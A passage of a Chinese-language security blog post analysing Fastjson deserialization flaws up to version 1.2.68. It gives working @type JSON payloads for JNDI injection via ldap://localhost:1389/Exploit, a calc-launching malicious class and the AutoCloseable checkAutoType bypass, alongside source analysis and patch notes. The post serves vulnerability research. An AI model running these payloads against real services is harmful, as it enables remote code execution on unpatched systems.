+
+    private Object getObjectOrPerformJndiLookup(Object object) &#123;
+        if (object instanceof String) &#123;
+            try &#123;
+                InitialContext initCtx = new InitialContext();
+                return initCtx.lookup((String)object); // 触发JNDI注入
+            &#125; catch (NamingException var3) &#123;
+                throw new IllegalArgumentException(var3);
+            &#125;
+        &#125; else &#123;
+            return object;
+        &#125;
+    &#125;</code></pre>
+<p><strong>CacheJndiTmLookup</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,\&quot;jndiNames\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>触发代码如下：</p>
+<pre><code class="java">package org.apache.ignite.cache.jta.jndi;
+public class CacheJndiTmLookup implements CacheTmLookup &#123;
+
+    public void setJndiNames(List&lt;String&gt; jndiNames) &#123;
+        this.jndiNames = jndiNames; // 传入jndiNames
+    &#125;
+
+    @Nullable
+    public TransactionManager getTm() throws IgniteException &#123;
+        assert this.jndiNames != null;
+
+        assert !this.jndiNames.isEmpty();
+
+        try &#123;
+            InitialContext ctx = new InitialContext();
+            Iterator var2 = this.jndiNames.iterator(); // 获取jndiNames
+
+            Object obj;
+            do &#123;
+                if (!var2.hasNext()) &#123;
+                    return null;
+                &#125;
+
+                String s = (String)var2.next(); // 获取jndiNames
+                obj = ctx.lookup(s); // 触发JNDI注入
+            &#125; while(obj == null || !(obj instanceof TransactionManager));
+
+            return (TransactionManager)obj;
+        &#125; catch (NamingException var5) &#123;
+            throw new IgniteException(&quot;Unable to lookup TM by: &quot; + this.jndiNames, var5);
+        &#125;
+    &#125;</code></pre>
+<p><strong>JtaTransactionConfig</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>触发代码如下：</p>
+<pre><code class="java">package com.ibatis.sqlmap.engine.transaction.jta;
+public class JtaTransactionConfig extends BaseTransactionConfig &#123;
+
+    public void setProperties(Properties props) throws SQLException, TransactionException &#123;
+        String utxName = null;
+
+        try &#123;
+            utxName = (String)props.get(&quot;UserTransaction&quot;); // 这里需要传入一个Properties对象，然后里面UserTransaction属性的值
+            InitialContext initCtx = new InitialContext();
+            this.userTransaction = (UserTransaction)initCtx.lookup(utxName); // 触发JNDI注入
+        &#125; catch (NamingException var4) &#123;
+            throw new SqlMapException(&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot; + utxName + &quot;).  Cause: &quot; + var4);
+        &#125;
+    &#125;</code></pre>
+<p><strong>Patch</strong></p>
+<p>扩充黑名单</p>
+<h3 id="1-2-68漏洞"><a href="#1-2-68漏洞" class="headerlink" title="1.2.68漏洞"></a>1.2.68漏洞</h3><blockquote>
+<p>1.2.68版本增加了新的安全参数<strong>safeMode</strong>，具体可参考这个<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">链接</a>，当safeMode开启后，autoType会被完全禁用，但是默认情况下时关闭的，开启safeMode代码：<code>ParserConfig.getGlobalInstance().setSafeMode(true);</code> </p>
+</blockquote>
+<p><strong>恶意类</strong></p>
+<pre><code class="java">package com.fastjson;
+
+import java.io.IOException;
+
+public class Exp implements AutoCloseable &#123;
+    public Exp () &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125; catch (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    @Override
+    public void close() throws Exception &#123; 
+
+    &#125;
+&#125;</code></pre>
+<p><strong>客户端</strong></p>
+<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;com.fastjson.Exp\&quot;&#125;&quot;;
+Object obj = JSON.parseObject(jsonstr);
+System.out.println(obj)</code></pre>
+<p>在不开启<code>safeMode</code>的情况下，我们可以使用<code>java.lang.AutoCloseable</code>引入任意恶意类，和<strong>1.2.47</strong>版本的洞很类似，这里利用到的是<code>checkAutoType()</code>函数中<code>expectClass</code>参数，如果加载的类实现了<code>expectClass</code>接口，或者是属于<code>expectClass</code>的子类，那么<code>checkAutoType()</code>函数就会检测通过</p>
+<p>利用这个特点，我们可以利用一个<code>TypeUtils.mappings</code>自带的类<code>java.lang.AutoCloseable</code>，这个类在进行反序列化时，如果检验到后面的字符串也是一个类的话，就会把自己作为<code>expectClass</code>调用<code>checkAutoType()</code>函数，这时候如果我们将恶意类编写成实现了<code>java.lang.AutoCloseable</code>接口的类，就可以成功绕过<code>checkAutoType()</code></p>
+<p><strong>分析</strong></p>
+<pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;    
+    protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features, int[] setFlags) &#123;
+
+        ...
+
+        if (!ref.equals(this.beanInfo.typeName) &amp;&amp; !parser.isEnabled(Feature.IgnoreAutoType)) &#123;
+            refObj = getSeeAlso(config, this.beanInfo, ref);
+            Class&lt;?&gt; userType = null;
+            if (refObj == null) &#123;
+                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);
+                userType = config.checkAutoType(ref, expectClass, lexer.getFeatures()); // ref实现了java.lang.AutoCloseable接口的恶意类，java.lang.AutoCloseable作为expectClass参数传入
+                refObj = parser.getConfig().getDeserializer(userType);
+            &#125;
+            Object typedObject = ((ObjectDeserializer)refObj).deserialze(parser, userType, fieldName); // 绕过成功之后进行反序列化
+        ...</code></pre>
+<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><ul>
+<li>在1.2.43版本之前的漏洞主要是通过在类名中加入混淆字符而绕过<code>checkAutoType()</code>，特别是1.2.43版本的漏洞利用让我知道了即使json字符串不规范也是可以解析成功的</li>
+<li>在1.2.45版本之后大部分都是通过第三方库寻找新的Gadget来绕过黑白名单，通过检查其实例创建函数或者set函数是否存在<code>lookup()</code>函数以及参数是否可控来挖掘</li>
+<li>1.2.47版本的漏洞利用十分的巧妙，通过分析黑名单校验的<code>getClassFromMapping()</code>字段，想到用缓存进行绕过</li>
+<li>1.2.68版本的漏洞利用也是同样巧妙，通过分析<code>expectClass</code>字段是否可控挖掘出了<code>java.lang.AutoCloseable</code>的Gadget，而且在Fastjson的可利用类中还存在着更多类似的利用，所以了解<code>checkAutoType()</code>方法中的可利用类十分必要，它们分别有：<ul>
+<li>白名单（符合白名单条件的类）</li>
+<li>TypeUtils.mappings （符合缓存映射中获取的类）</li>
+<li>typeMapping （ParserConfig中本身带有的集合）</li>
+<li>deserializers （符合反序列化器的类）</li>
+</ul>
+</li>
+</ul>
+<h2 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h2><p>由某些大哥爆破出来的哈希黑名单列表：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/994/">Fastjson 流程分析及 RCE 分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">Fastjson反序列化漏洞基础</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7878">某json &lt;= 1.2.68 远程代码执行漏洞分析</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">漏洞研究</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Laravel Debug mode RCE复现</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/12/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">内网穿透</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96"><span class="toc-number">1.</span> <span class="toc-text">安装依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">2.2.</span> <span class="toc-text">反序列化操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">2.3.</span> <span class="toc-text">反序列化流程图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">反序列化调用流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-24%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">1.2.24漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-41%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">1.2.41漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">1.2.42漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">1.2.43漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-45%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">1.2.45漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.</span> <span class="toc-text">1.2.47漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-62%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.7.</span> <span class="toc-text">1.2.62漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-66%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.8.</span> <span class="toc-text">1.2.66漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.9.</span> <span class="toc-text">1.2.68漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">漏洞总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">5.</span> <span class="toc-text">哈希黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Handlebars AST注入"/></a><div class="content"><a class="title" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入">Handlebars AST注入</a><time datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dubbo反序列化漏洞研究"/></a><div class="content"><a class="title" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究">Dubbo反序列化漏洞研究</a><time datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yii2最新反序列化POP链分析"/></a><div class="content"><a class="title" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析">Yii2最新反序列化POP链分析</a><time datetime="2021-06-03T15:09:56.000Z" title="Created 2021-06-03 23:09:56">2021-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laravel Debug mode RCE复现"/></a><div class="content"><a class="title" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现">Laravel Debug mode RCE复现</a><time datetime="2021-05-28T06:15:46.000Z" title="Created 2021-05-28 14:15:46">2021-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
